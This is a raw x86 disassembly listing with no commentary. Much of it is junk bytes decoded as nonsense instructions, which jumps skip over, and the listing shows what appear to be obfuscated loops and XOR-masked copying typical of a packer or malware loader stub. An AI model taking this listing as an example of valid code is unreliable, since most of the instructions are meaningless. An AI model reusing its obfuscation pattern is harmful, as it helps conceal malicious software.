  402976:	sub    eax,DWORD PTR [ecx]
  402978:	cmc    
  402979:	je     0x402997
  40297f:	xchg   edx,eax
  402980:	push   0xa
  402982:	pop    ecx
  402983:	push   0x4
  402985:	pop    ebx
  402986:	inc    ebx
  402987:	xchg   ebx,ecx
  402989:	sub    ebx,ecx
  40298b:	xchg   ebx,ecx
  40298d:	dec    ecx
  40298e:	mov    eax,DWORD PTR [ebp-0x1c]
  402991:	imul   eax,ecx
  402994:	add    esp,eax
  402996:	xchg   edx,eax
  402997:	push   eax
  402998:	xor    ebx,ebx
  40299a:	mov    edx,esp
  40299c:	jmp    0x402a6f
  4029a1:	jns    0x4029c0
  4029a3:	inc    ebp
  4029a4:	ds gs mov dh,0x7d
  4029a8:	mov    ebp,0x6beb4b4b
  4029ad:	push   edx
  4029ae:	xlat   BYTE PTR ds:[ebx]
  4029af:	stc    
  4029b0:	mov    ebx,0x7c7c0cc6
  4029b5:	mov    ds:0xbd7c7c7c,al
  4029ba:	dec    ebp
  4029bb:	int    0x3e
  4029bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029be:	leave  
  4029bf:	iret   
  4029c0:	pop    edi
  4029c1:	jae    0x402a20
  4029c3:	push   ds
  4029c4:	lock mov edi,0xe5998441
  4029ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029cb:	loopne 0x402a27
  4029cd:	neg    DWORD PTR [ebx-0x6]
  4029d0:	sub    BYTE PTR [edx-0x3d5790e5],ch
  4029d6:	dec    edx
  4029d7:	mov    ds:0xb2c914a0,al
  4029dc:	mov    bh,al
  4029de:	leave  
  4029df:	int3   
  4029e0:	out    0xd3,al
  4029e2:	xchg   edx,eax
  4029e3:	add    dl,BYTE PTR [esi-0x19e63dfb]
  4029e9:	je     0x4029ce
  4029eb:	cdq    
  4029ec:	std    
  4029ed:	fs dec ebx
  4029ef:	xchg   esi,eax
  4029f0:	call   0x3a9c:0x6450cc93
  4029f7:	sbb    eax,0x674d45c6
  4029fc:	repnz and BYTE PTR [eax-0x25],ch
  402a00:	test   eax,0x38a6aa8f
  402a05:	jecxz  0x402a13
  402a07:	xor    BYTE PTR [esi],dh
  402a09:	adc    ah,BYTE PTR [ebx+0x71]
  402a0c:	rcr    ebp,0xe0
  402a0f:	in     eax,0x43
  402a11:	and    edi,ecx
  402a13:	and    bh,BYTE PTR [ebp-0x57038cab]
  402a19:	sub    ebx,DWORD PTR [edx]
  402a1b:	adc    DWORD PTR [edx],ebp
  402a1d:	int3   
  402a1e:	add    ebp,DWORD PTR [edi+0x0]
  402a21:	adc    eax,0x345a53b6
  402a26:	fmul   DWORD PTR [edi-0x7a4cc608]
  402a2c:	cmp    BYTE PTR [edx+0x37],ch
  402a2f:	xchg   ecx,eax
  402a30:	fcom   DWORD PTR [eax+0x2d53a4df]
  402a36:	inc    esi
  402a37:	mov    BYTE PTR [ebx],dl
  402a39:	add    DWORD PTR [ecx+0x1ea29f7e],esi
  402a3f:	xor    DWORD PTR [ebx],ecx
  402a41:	loop   0x4029e6
  402a43:	lods   eax,DWORD PTR ds:[esi]
  402a44:	and    eax,ecx
  402a46:	xor    eax,0xf672d9ef
  402a4b:	icebp  
  402a4c:	pop    esp
  402a4d:	cwde   
  402a4e:	sahf   
  402a4f:	(bad)  
  402a50:	in     al,0xb4
  402a52:	inc    ecx
  402a53:	aas    
  402a54:	(bad)  
  402a55:	jmp    0x402a74
  402a57:	sbb    eax,0x514d99a5
  402a5c:	push   esp
  402a5d:	sti    
  402a5e:	int3   
  402a5f:	call   0xe4a4:0xc2fbbf68
  402a66:	pop    esp
  402a67:	mov    ds:0x620b5802,ax
  402a6d:	inc    edx
  402a6e:	mov    cl,0x4a
  402a70:	inc    ebx
  402a71:	add    ebx,DWORD PTR [edx+ebx*1]
  402a74:	jmp    0x402b47
  402a79:	in     al,dx
  402a7a:	test   eax,0xb57d3fe8
  402a7f:	sti    
  402a80:	mov    ecx,0xb7fd3b83
  402a85:	repz or eax,0xf0c3d04
  402a8b:	jl     0x402b09
  402a8d:	mov    ds:0x917c7c7c,al
  402a92:	jno    0x402aaa
  402a94:	dec    edx
  402a95:	daa    
  402a96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a97:	mov    edx,0xe46716c4
  402a9c:	lods   eax,DWORD PTR ds:[esi]
  402a9d:	(bad)  [ebx+0x4b840b3e]
  402aa3:	inc    eax
  402aa4:	xor    BYTE PTR [ecx],dl
  402aa6:	int    0x6c
  402aa8:	icebp  
  402aa9:	mov    BYTE PTR [edi+0x25aad2d8],cl
  402aaf:	inc    eax
  402ab0:	cmp    al,0xce
  402ab2:	cmp    dl,ah
  402ab4:	cmp    DWORD PTR [edi-0x19ab1b3d],eax
  402aba:	jecxz  0x402aff
  402abc:	popf   
  402abd:	(bad)  
  402abe:	xor    DWORD PTR [ebx-0x185820c],edx
  402ac4:	cwde   
  402ac5:	lods   al,BYTE PTR ds:[esi]
  402ac6:	shl    DWORD PTR [ecx-0x3e],0xc6
  402aca:	in     eax,0xa5
  402acc:	(bad)  
  402acd:	outs   dx,BYTE PTR ds:[esi]
  402ace:	or     ecx,DWORD PTR [esi]
  402ad0:	push   0x4cca822f
  402ad5:	les    edi,FWORD PTR [bx+0x6900]
  402ada:	out    0x72,al
  402adc:	add    al,0x59
  402ade:	in     eax,0x68
  402ae0:	mov    esp,0xb3492b29
  402ae5:	mov    dh,0x58
  402ae7:	shl    al,cl
  402ae9:	jne    0x402aea
  402aeb:	retf   0xbbbd
  402aee:	and    dl,BYTE PTR [esi+0x13]
  402af1:	sbb    eax,0xcddfdf42
  402af6:	scas   eax,DWORD PTR es:[edi]
  402af7:	in     eax,0xd9
  402af9:	das    
  402afa:	mov    ds:0xd1ca717a,al
  402aff:	inc    eax
  402b00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b01:	mov    cl,BYTE PTR [esi-0x562e1321]
  402b07:	fst    QWORD PTR [esi-0x5b]
  402b0a:	(bad)  
  402b0c:	icebp  
  402b0d:	mov    edi,0x40f3e91a
  402b12:	scas   al,BYTE PTR es:[edi]
  402b13:	sar    DWORD PTR ds:0x346fe836,cl
  402b19:	das    
  402b1a:	scas   al,BYTE PTR es:[edi]
  402b1b:	shl    BYTE PTR [eax+0x5a],cl
  402b1e:	in     al,dx
  402b1f:	add    al,0xee
  402b21:	fisubr DWORD PTR [ecx]
  402b23:	(bad)
  402b26:	xor    DWORD PTR [eax+0x64],0x8bf88c49
  402b2d:	cmp    al,0x6a
  402b2f:	push   eax
  402b30:	lods   al,BYTE PTR ds:[esi]
  402b31:	(bad)  
  402b33:	imul   esp,DWORD PTR [ebp-0x65],0x9bd9193d
  402b3a:	dec    eax
  402b3b:	or     al,BYTE PTR [edi-0x30]
  402b3e:	xor    eax,0x281b4cca
  402b43:	ja     0x402b93
  402b45:	jp     0x402b37
  402b47:	dec    ebx
  402b48:	xor    edx,edx
  402b4a:	add    DWORD PTR [ebp-0xc],ebx
  402b4d:	jmp    0x402c20
  402b52:	dec    ebx
  402b53:	jge    0x402bcf
  402b55:	cmp    BYTE PTR [edx-0x7d],0x6d
  402b59:	jge    0x402b07
  402b5b:	push   cs
  402b5c:	loope  0x402b36
  402b5e:	sub    BYTE PTR [esi],bl
  402b60:	ja     0x402b46
  402b62:	mov    dl,0xf
  402b64:	jl     0x402be2
  402b66:	mov    ds:0x477c7c7c,al
  402b6b:	sar    edi,0x75
  402b6e:	xchg   esp,eax
  402b6f:	sub    ecx,DWORD PTR [edi+0x61]
  402b72:	cmp    ecx,DWORD PTR [edx+0x7c2b247e]
  402b78:	adc    edi,DWORD PTR [ebx]
  402b7a:	in     al,0x2
  402b7c:	push   esp
  402b7d:	cmp    eax,DWORD PTR [esi+ebp*2]
  402b80:	sbb    eax,0x22251bec
  402b85:	sbb    al,0xe4
  402b87:	aam    0xd2
  402b89:	adc    BYTE PTR [eax],bl
  402b8b:	data16 jg 0x402bbc
  402b8e:	adc    BYTE PTR [esi*4-0x140d7c5],0xa7
  402b96:	mov    dh,0x6c
  402b98:	mov    al,ds:0x6107ed28
  402b9d:	xor    BYTE PTR [ecx+edi*2],dh
  402ba0:	pop    ss
  402ba1:	push   edi
  402ba2:	call   0xfe3c:0x63405fec
  402ba9:	push   cs
  402baa:	das    
  402bab:	xor    al,0x2c
  402bad:	cmp    dl,dl
  402baf:	shl    ch,cl
  402bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bb2:	out    dx,eax
  402bb3:	pop    ss
  402bb4:	jecxz  0x402c31
  402bb6:	sahf   
  402bb7:	jg     0x402bc2
  402bb9:	(bad)  
  402bba:	sbb    cl,0x77
  402bbd:	mov    eax,ds:0x792429a1
  402bc2:	jle    0x402ba6
  402bc4:	jb     0x402c37
  402bc6:	adc    ch,BYTE PTR [edi-0x4a0a4840]
  402bcc:	rcl    BYTE PTR [edi],cl
  402bce:	xchg   bh,ah
  402bd0:	and    DWORD PTR [esi-0x53],edi
  402bd3:	retf   
  402bd4:	mov    ebx,0xeabf36b2
  402bd9:	mov    ebx,DWORD PTR [esi+0x65ac98e5]
  402bdf:	stos   BYTE PTR es:[edi],al
  402be0:	push   ecx
  402be1:	ret    
  402be2:	fcomp  DWORD PTR [edi+ebx*4]
  402be5:	sub    edx,DWORD PTR [eax+0x7369da98]
  402beb:	icebp  
  402bec:	xchg   ebx,eax
  402bed:	or     BYTE PTR [esi-0x69f87d6],ah
  402bf3:	adc    dl,BYTE PTR [edx+eax*1]
  402bf6:	add    DWORD PTR [ebx+0x2190ae12],0x8eba3da8
  402c00:	xor    dl,0x3b
  402c03:	idiv   BYTE PTR [eax+0x37]
  402c06:	mov    ds:0x87e0b236,eax
  402c0b:	push   ecx
  402c0c:	mov    ecx,es
  402c0e:	pop    ds
  402c0f:	retf   0x3285
  402c12:	clc    
  402c13:	mov    edx,0xad84f58b
  402c18:	mov    ds:0x96d55eaf,al
  402c1d:	and    ch,BYTE PTR [ecx]
  402c1f:	cs pop ebx
  402c21:	mov    eax,DWORD PTR [ebp-0xc]
  402c24:	pop    edi
  402c25:	pop    esi
  402c26:	pop    ebx
  402c27:	leave  
  402c28:	ret    0x10
  402c2b:	push   ebp
  402c2c:	mov    ebp,esp
  402c2e:	sub    esp,0x20
  402c31:	leave  
  402c32:	ret    0x10
  402c35:	push   ebp
  402c36:	mov    ebp,esp
  402c38:	push   ecx
  402c39:	and    DWORD PTR ds:0x424854,0x0
  402c43:	jmp    0x402c56
  402c48:	xor    eax,eax
  402c4a:	xor    eax,DWORD PTR ds:0x424854
  402c50:	inc    eax
  402c51:	mov    ds:0x424854,eax
  402c56:	cmp    DWORD PTR ds:0x424854,0x1e
  402c5d:	jae    0x402d01
  402c63:	cmp    DWORD PTR ds:0x424854,0x11
  402c6a:	jne    0x402c83
  402c70:	push   0x0
  402c72:	push   0x44b6e8
  402c77:	push   DWORD PTR [ebp-0x20]
  402c7a:	push   DWORD PTR [ebp-0x14]
  402c7d:	call   DWORD PTR ds:0x4430d0
  402c83:	cmp    DWORD PTR ds:0x424854,0x10
  402c8a:	jne    0x402c9e
  402c90:	xor    eax,eax
  402c92:	add    eax,DWORD PTR ds:0x424854
  402c98:	inc    eax
  402c99:	mov    ds:0x424854,eax
  402c9e:	jmp    0x402c48
  402ca3:	and    DWORD PTR ds:0x4489a4,0x0
  402cad:	mov    edx,DWORD PTR ds:0x4489a4
  402cb3:	inc    edx
  402cb4:	mov    DWORD PTR ds:0x4489a4,edx
  402cba:	cmp    DWORD PTR ds:0x4489a4,0xd
  402cc1:	jne    0x402cda
  402cc7:	push   0x424850
  402ccc:	push   DWORD PTR [ebp-0x28]
  402ccf:	push   0x3f88
  402cd4:	call   DWORD PTR ds:0x443000
  402cda:	cmp    DWORD PTR ds:0x4489a4,0xc
  402ce1:	jne    0x402cf4
  402ce7:	mov    edx,DWORD PTR ds:0x4489a4
  402ced:	inc    edx
  402cee:	mov    DWORD PTR ds:0x4489a4,edx
  402cf4:	cmp    DWORD PTR ds:0x4489a4,0x17
  402cfb:	jb     0x402cad
  402d01:	push   ecx
  402d02:	mov    eax,0xf89c8535
  402d07:	mov    DWORD PTR ds:0x424848,0x10
  402d11:	cmp    DWORD PTR ds:0x424848,0x0
  402d18:	je     0x402d61
  402d1e:	cmp    DWORD PTR ds:0x424848,0x1d
  402d25:	jne    0x402d4f
  402d2b:	push   0x44b6d0
  402d30:	push   0x44b6d0
  402d35:	push   0x8e35
  402d3a:	push   0x4109ab
  402d3f:	push   0x410971
  402d44:	push   0x410927
  402d49:	call   DWORD PTR ds:0x443348
  402d4f:	mov    edx,DWORD PTR ds:0x424848
  402d55:	dec    edx
  402d56:	mov    DWORD PTR ds:0x424848,edx
  402d5c:	jmp    0x402d11
  402d61:	mov    DWORD PTR [ebp-0x8],eax
  402d64:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  402d6b:	mov    edx,DWORD PTR [ebp-0x8]
  402d6e:	push   esi
  402d6f:	mov    ecx,0x7510857
  402d74:	xor    edx,ecx
  402d76:	mov    esi,0x32729e
  402d7b:	push   edi
  402d7c:	mov    edi,DWORD PTR [ebp+0x10]
  402d7f:	add    edx,esi
  402d81:	cmp    edi,edx
  402d83:	je     0x403249
  402d89:	mov    edx,DWORD PTR [ebp-0x8]
  402d8c:	mov    eax,DWORD PTR [ebp-0x4]
  402d8f:	xor    eax,ecx
  402d91:	mov    edi,0xffcd8d62
  402d96:	sub    edi,eax
  402d98:	add    edi,DWORD PTR [ebp+0x10]
  402d9b:	xor    edx,ecx
  402d9d:	add    edx,esi
  402d9f:	cmp    edx,edi
  402da1:	ja     0x4030d5
  402da7:	jmp    0x402f16
  402dac:	sbb    eax,0xa4b3a405
  402db1:	ins    DWORD PTR es:[edi],dx
  402db2:	std    
  402db3:	pop    ebp
  402db4:	mov    eax,0x3be45e2b
  402db9:	xor    eax,0xef88411
  402dbe:	jl     0x402e3c
  402dc0:	into   
  402dc1:	jg     0x402e3f
  402dc3:	jl     0x402e27
  402dc5:	push   ecx
  402dc6:	nop
  402dc7:	imul   esi,DWORD PTR [ebx+0x117ba3a9],0x1d
  402dce:	gs pusha 
  402dd0:	push   edx
  402dd1:	dec    ecx
  402dd2:	push   0x9360d93f
  402dd7:	jnp    0x402e1b
  402dd9:	cmp    al,0xfd
  402ddb:	icebp  
  402ddc:	fsub   QWORD PTR [edx-0x79ceedf8]
  402de2:	add    eax,0x5056d35c
  402de7:	mov    BYTE PTR [ebp+0x69],bl
  402dea:	sti    
  402deb:	push   0xffffffdb
  402ded:	sti    
  402dee:	mov    ah,0xd9
  402df0:	(bad)  
  402df1:	jnp    0x402d9b
  402df3:	sti    
  402df4:	sub    BYTE PTR [eax],0xc
  402df7:	test   BYTE PTR [edi],cl
  402df9:	add    eax,0x3f7b37cd
  402dfe:	int    0x52
  402e00:	loop   0x402db5
  402e02:	daa    
  402e03:	pushf  
  402e04:	rol    BYTE PTR [esi-0x80],0x52
  402e08:	in     al,0x57
  402e0a:	rcl    BYTE PTR [eax],0x19
  402e0d:	cld    
  402e0e:	add    eax,0x96f1e92a
  402e13:	std    
  402e14:	mov    eax,0xd2eac7b7
  402e19:	fisubr DWORD PTR [ecx-0x80]
  402e1c:	push   cs
  402e1d:	test   al,0xaf
  402e1f:	mov    ebp,0xd5a4551b
  402e24:	out    0x21,al
  402e26:	retf   0xfec9
  402e29:	or     bh,BYTE PTR [edi+0x3c]
  402e2c:	inc    ebx
  402e2d:	mov    bl,dl
  402e2f:	enter  0xc67d,0xfc
  402e33:	js     0x402dc3
  402e35:	outs   dx,DWORD PTR ds:[esi]
  402e36:	bound  edi,QWORD PTR [ecx+eax*8+0x7f]
  402e3a:	iret   
  402e3b:	jmp    0x7cc1:0xb7f29211
  402e42:	jno    0x402e98
  402e44:	test   DWORD PTR [eax],ecx
  402e46:	retf   
  402e47:	lock and ah,BYTE PTR fs:[ecx+0x63d9c4c7]
  402e4f:	das    
  402e50:	iret   
  402e51:	dec    ecx
  402e52:	push   ebx
  402e53:	push   0x6d2eb0b0
  402e58:	pop    edi
  402e59:	inc    ebx
  402e5a:	add    eax,0xfd1e4cb4
  402e5f:	pushf  
  402e60:	xchg   ecx,eax
  402e61:	sbb    DWORD PTR [edi],eax
  402e63:	call   0xc7d5:0x2dd8e54c
  402e6a:	popa   
  402e6b:	sub    bh,ah
  402e6d:	adc    eax,0xd0b6e75b
  402e72:	ss mov dh,0x9a
  402e75:	aad    0xca
  402e77:	aam    0x97
  402e79:	jno    0x402ea2
  402e7b:	jns    0x402e43
  402e7d:	mov    edx,0x337ef5fc
  402e82:	push   ebp
  402e83:	aaa    
  402e84:	int3   
  402e85:	outs   dx,DWORD PTR ds:[esi]
  402e86:	sbb    dl,BYTE PTR [ecx+0x226eff37]
  402e8c:	shr    DWORD PTR [ebx],cl
  402e8e:	jns    0x402e58
  402e90:	push   edx
  402e91:	cmp    ecx,DWORD PTR [ecx+0x45]
  402e94:	(bad)  
  402e95:	mov    ebp,0x110acf01
  402e9a:	jno    0x402eaa
  402e9c:	pushf  
  402e9d:	pusha  
  402e9e:	adc    eax,0xd8108cd2
  402ea3:	push   ebx
  402ea4:	fcom   DWORD PTR [ebx-0x5ae2484a]
  402eaa:	jb     0x402ef5
  402eac:	jg     0x402e79
  402eae:	mov    gs,esi
  402eb0:	ja     0x402e35
  402eb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402eb3:	loop   0x402e8b
  402eb5:	jp     0x402efb
  402eb7:	popf   
  402eb8:	rol    BYTE PTR [ebx-0x4fef3969],cl
  402ebe:	cmp    esi,esi
  402ec0:	mov    esi,0x4f1433b6
  402ec5:	sub    DWORD PTR [eax+0x5cd60cf8],ebx
  402ecb:	popf   
  402ecc:	mov    esp,0x97e94324
  402ed1:	xchg   esp,eax
  402ed2:	push   edx
  402ed3:	inc    esp
  402ed4:	lods   al,BYTE PTR ds:[esi]
  402ed5:	xor    ch,al
  402ed7:	sbb    ch,BYTE PTR [edi]
  402ed9:	or     BYTE PTR [ebx+0x79],ah
  402edc:	dec    ebp
  402edd:	mov    al,BYTE PTR [ebx-0x3e1dac1f]
  402ee3:	shr    DWORD PTR [ecx+esi*2-0x1a6e6263],0xc
  402eeb:	add    esi,DWORD PTR [edx+0x20]
  402eee:	popa   
  402eef:	xchg   edi,eax
  402ef0:	retf   0xe791
  402ef3:	div    ebp
  402ef5:	int    0xf3
  402ef7:	fild   WORD PTR [ebx-0x7aff297a]
  402efd:	call   0x996:0x928c392e
  402f04:	jmp    0x402e9a
  402f06:	arpl   WORD PTR [ebx],bx
  402f08:	adc    BYTE PTR [edx-0x589de03c],cl
  402f0e:	inc    ebp
  402f0f:	cwde   
  402f10:	int    0x71
  402f12:	jns    0x402ee4
  402f14:	push   ds
  402f15:	std    
  402f16:	push   ebx
  402f17:	jmp    0x402f21
  402f1c:	mov    esi,0x32729e
  402f21:	mov    eax,DWORD PTR [ebp-0x8]
  402f24:	mov    edi,DWORD PTR [ebp-0x4]
  402f27:	xor    edi,ecx
  402f29:	add    edi,esi
  402f2b:	mov    esi,DWORD PTR [ebp+0x8]
  402f2e:	imul   edi,edx
  402f31:	mov    ebx,DWORD PTR [ebp+0xc]
  402f34:	xor    eax,ecx
  402f36:	add    eax,edx
  402f38:	mov    al,BYTE PTR [ebx+eax*1+0x32729e]
  402f3f:	mov    BYTE PTR [edi+esi*1],al
  402f42:	mov    eax,DWORD PTR [ebp-0x4]
  402f45:	xor    eax,ecx
  402f47:	lea    edx,[edx+eax*1+0x32729e]
  402f4e:	mov    eax,DWORD PTR [ebp-0x4]
  402f51:	xor    eax,ecx
  402f53:	mov    esi,0xffcd8d62
  402f58:	sub    esi,eax
  402f5a:	add    esi,DWORD PTR [ebp+0x10]
  402f5d:	jmp    0x4030cc
  402f62:	jp     0x402f87
  402f64:	pop    ebp
  402f65:	cmp    BYTE PTR [ebp+0x7a],bl
  402f68:	jge    0x402fcf
  402f6a:	mov    ss,WORD PTR [ebp+0x4f]
  402f6d:	push   edx
  402f6e:	idiv   DWORD PTR [ebx]
  402f70:	popf   
  402f71:	lahf   
  402f72:	dec    edx
  402f73:	add    DWORD PTR [esp+edi*2-0x32],edi
  402f77:	jg     0x402ff5
  402f79:	jl     0x402f10
  402f7b:	jl     0x402fa1
  402f7d:	aaa    
  402f7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f7f:	sub    edx,edx
  402f81:	cmp    DWORD PTR [eax-0xb7f6c15],esp
  402f87:	mov    ch,0x65
  402f89:	test   BYTE PTR [edx],cl
  402f8b:	loop   0x403001
  402f8d:	aam    0xbe
  402f8f:	push   0x4306750d
  402f94:	lds    esi,FWORD PTR [edi+0x2c9b64ee]
  402f9a:	adc    DWORD PTR [eax+0x27],edi
  402f9d:	sub    eax,0xf12fd38
  402fa2:	pop    ebx
  402fa3:	ret    
  402fa4:	sbb    eax,0xece5970f
  402fa9:	int    0xa0
  402fab:	ss addr16 fcmovb st,st(2)
  402faf:	retf   0xf7e9
  402fb2:	or     eax,0x11f22d6e
  402fb7:	int3   
  402fb8:	inc    edi
  402fb9:	in     eax,dx
  402fba:	repz or DWORD PTR [edx+0x65a855e6],ecx
  402fc1:	(bad)  [ebp-0x47]
  402fc4:	sbb    eax,0xe8ad7516
  402fc9:	fsub   st,st(2)
  402fcb:	cmp    eax,0xd37f10d5
  402fd0:	stos   BYTE PTR es:[edi],al
  402fd1:	aam    0xc2
  402fd3:	mov    ecx,0x289a8608
  402fd8:	in     eax,dx
  402fd9:	mov    WORD PTR [ecx+0x2f664c31],?
  402fdf:	dec    esp
  402fe0:	sahf   
  402fe1:	aad    0xf2
  402fe3:	ds pop esi
  402fe5:	push   ss
  402fe6:	out    dx,al
  402fe7:	xchg   ecx,eax
  402fe8:	jo     0x402fa1
  402fea:	pop    eax
  402feb:	add    DWORD PTR [ecx-0x2c36356d],esp
  402ff1:	dec    ecx
  402ff2:	rep ins DWORD PTR es:[edi],dx
  402ff4:	inc    edi
  402ff5:	or     dl,BYTE PTR [ecx]
  402ff7:	xor    esi,DWORD PTR [ebx-0x4be00d09]
  402ffd:	sbb    DWORD PTR [ebx+0x19],edi
  403000:	test   eax,0xcd647a0e
  403005:	inc    esp
  403006:	into   
  403007:	dec    edi
  403008:	jge    0x402fdf
  40300a:	adc    DWORD PTR [edi+ecx*4-0x1c],esi
  40300e:	rcl    BYTE PTR [edx+0x68370cdf],cl
  403014:	enter  0xad93,0x81
  403018:	sahf   
  403019:	popf   
  40301a:	xor    dh,ch
  40301c:	or     eax,0x91531238
  403021:	enter  0xf635,0xc
  403025:	jp     0x403051
  403027:	std    
  403028:	jp     0x403079
  40302a:	in     al,dx
  40302b:	lea    esp,[esi+0x9]
  40302e:	xchg   DWORD PTR [edx],edi
  403030:	cs jg  0x4030a0
  403033:	nop
  403034:	mov    DWORD PTR [ebx],0x135b443f
  40303a:	mov    esp,0xeeb0fc7c
  40303f:	arpl   di,ax
  403041:	lods   eax,DWORD PTR ds:[esi]
  403042:	mov    dl,0x3a
  403044:	mov    ds:0xfafbe94a,al
  403049:	ds inc esp
  40304b:	push   ds
  40304c:	xchg   esi,eax
  40304d:	lds    ecx,FWORD PTR [edi+0x91c062]
  403053:	idiv   BYTE PTR [ebp+0x68c25363]
  403059:	das    
  40305a:	jmp    0xbf2d:0x9a641e01
  403061:	ror    DWORD PTR [esi],0x60
  403064:	mov    al,ds:0xe6fb502e
  403069:	mov    BYTE PTR [ebp+0xc95b775],ch
  40306f:	xlat   BYTE PTR ds:[ebx]
  403070:	xchg   edi,eax
  403071:	xor    al,0xbe
  403073:	mov    ecx,0xdc7a5691
  403078:	adc    edi,esp
  40307a:	xchg   esi,eax
  40307b:	pop    edi
  40307c:	sti    
  40307d:	mov    ebx,0xbb6f6898
  403082:	mov    eax,0x8d3ed9d5
  403087:	jecxz  0x403022
  403089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40308a:	(bad)  
  40308b:	outs   dx,BYTE PTR ds:[esi]
  40308c:	jbe    0x403077
  40308e:	mov    cl,0xf5
  403090:	(bad)  
  403091:	retf   
  403092:	int    0x7e
  403094:	dec    esi
  403095:	cmp    ebp,DWORD PTR [ecx+0x5b99d87c]
  40309b:	add    ebx,edi
  40309d:	repz xchg dh,dl
  4030a0:	or     al,0xf8
  4030a2:	fidiv  WORD PTR [edi]
  4030a4:	mov    fs,WORD PTR [ebx+0x15]
  4030a7:	popf   
  4030a8:	or     al,0xd1
  4030aa:	adc    edi,DWORD PTR [esi+0x69e9623]
  4030b0:	jb     0x403110
  4030b2:	(bad)  
  4030b3:	in     al,dx
  4030b4:	call   0x3871:0xb88416d3
  4030bb:	lock xlat BYTE PTR ds:[ebx]
  4030bd:	mov    ch,0x5c
  4030bf:	dec    eax
  4030c0:	test   BYTE PTR [esi-0x3a54d26e],bl
  4030c6:	repnz dec ecx
  4030c8:	add    eax,0x3b9faf7f
  4030cd:	(bad)  
  4030ce:	jbe    0x402f1c
  4030d4:	pop    ebx
  4030d5:	mov    eax,0xf89c8534
  4030da:	jmp    0x403249
  4030df:	jno    0x403104
  4030e1:	in     al,0x69
  4030e3:	cli    
  4030e4:	ins    DWORD PTR es:[edi],dx
  4030e5:	cmp    DWORD PTR [ebx+0x12],0x30299de8
  4030ec:	mov    al,ds:0x31c0f34
  4030f1:	jl     0x40316f
  4030f3:	into   
  4030f4:	jg     0x403172
  4030f6:	jl     0x40310e
  4030f8:	dec    edx
  4030f9:	les    ecx,FWORD PTR [esi-0x7c938e32]
  4030ff:	das    
  403100:	cdq    
  403101:	std    
  403102:	fldenv [eax+0x20]
  403105:	add    bl,BYTE PTR [ecx+0x5641da8b]
  40310b:	leave  
  40310c:	adc    cl,al
  40310e:	push   es
  40310f:	or     al,0x15
  403111:	(bad)  
  403113:	mov    dl,0x89
  403115:	loopne 0x403195
  403117:	(bad)  
  403118:	aaa    
  403119:	xchg   esp,eax
  40311a:	and    eax,0x37eee137
  40311f:	cdq    
  403120:	ret    
  403121:	dec    ebx
  403122:	push   esp
  403123:	jp     0x403110
  403125:	repnz mov ebx,esi
  403128:	rcl    BYTE PTR [eax-0x60],cl
  40312b:	shl    DWORD PTR [esi-0x844eebe],cl
  403131:	or     eax,0x18d5e8bb
  403136:	mov    esi,0x1ddc3a49
  40313b:	loope  0x40318d
  40313d:	xchg   DWORD PTR [ebx-0x377b9b0e],ebp
  403143:	std    
  403144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403145:	push   ds
  403146:	jbe    0x40318e
  403148:	scas   al,BYTE PTR es:[edi]
  403149:	fisttp WORD PTR [esi]
  40314b:	jge    0x40314f
  40314d:	cmp    BYTE PTR [esi-0x236217b3],ah
  403153:	inc    esp
  403154:	or     BYTE PTR fs:[eax+0x63bd5d8b],0x34
  40315c:	jno    0x4030f3
  40315e:	xchg   edi,eax
  40315f:	and    al,0xa
  403161:	out    0x7,eax
  403163:	into   
  403164:	shl    esp,1
  403166:	pop    edi
  403167:	and    eax,DWORD PTR [ebp+0xd]
  40316a:	in     eax,dx
  40316b:	test   BYTE PTR [edx-0x36ad9e41],0x76
  403172:	dec    edi
  403173:	inc    ebx
  403174:	pop    edx
  403175:	xor    eax,0x746033de
  40317a:	add    BYTE PTR [eax-0x2c974608],0x69
  403181:	retf   
  403182:	sub    eax,0xbb9efb15
  403187:	xor    ch,bh
  403189:	fstp   QWORD PTR [esi-0x3d229a9]
  40318f:	mov    edx,0x8795b7a9
  403194:	xchg   DWORD PTR [edi+0x4d],ebx
  403197:	and    esp,DWORD PTR [ebx]
  403199:	mov    esi,0x22735eda
  40319e:	jae    0x403145
  4031a0:	push   esi
  4031a1:	mov    ah,0x1e
  4031a3:	cmp    ebx,DWORD PTR ds:0x19522114
  4031a9:	icebp  
  4031aa:	in     al,dx
  4031ab:	push   ecx
  4031ac:	pop    ebp
  4031ad:	ja     0x403162
  4031af:	xor    bh,BYTE PTR fs:[ebp*2-0x242df6d3]
  4031b7:	popa   
  4031b8:	xchg   ecx,eax
  4031b9:	pop    ss
  4031ba:	ret    0xbbed
  4031bd:	sub    dl,0xe9
  4031c0:	cmp    al,0xa
  4031c2:	add    eax,0xc3487a64
  4031c7:	sbb    al,0x6a
  4031c9:	xor    esp,ecx
  4031cb:	mov    edx,0xd24e9e60
  4031d0:	repz ret 
  4031d2:	and    DWORD PTR [ebx+0x61],edi
  4031d5:	pop    eax
  4031d6:	nop
  4031d7:	arpl   WORD PTR [ebx+0x63],ax
  4031da:	jmp    0xb7345870
  4031df:	adc    ch,cl
  4031e1:	icebp  
  4031e2:	inc    ebx
  4031e3:	jmp    0x403257
  4031e5:	rol    DWORD PTR fs:[eax-0x13ce7fa7],cl
  4031ec:	pop    edx
  4031ed:	jnp    0x4031c3
  4031ef:	(bad)  
  4031f0:	push   ecx
  4031f1:	jnp    0x4031a2
  4031f3:	jge    0x4031d4
  4031f5:	in     eax,dx
  4031f6:	out    dx,eax
  4031f7:	(bad)  
  4031f8:	fsub   QWORD PTR [esi-0x33aa12a1]
  4031fe:	sti    
  4031ff:	lods   al,BYTE PTR ds:[esi]
  403200:	retf   0xa6e3
  403203:	push   esp
  403204:	jno    0x4031eb
  403206:	jne    0x403272
  403208:	sbb    eax,0x1e291d2d
  40320d:	and    DWORD PTR [ebx-0x4138dde6],eax
  403213:	push   ss
  403214:	fcomp  QWORD PTR [edx-0x5d]
  403217:	dec    ecx
  403218:	sub    cl,BYTE PTR fs:[ecx]
  40321b:	pop    eax
  40321c:	mov    BYTE PTR [esi],ch
  40321e:	jb     0x4031f7
  403220:	daa    
  403221:	(bad)  
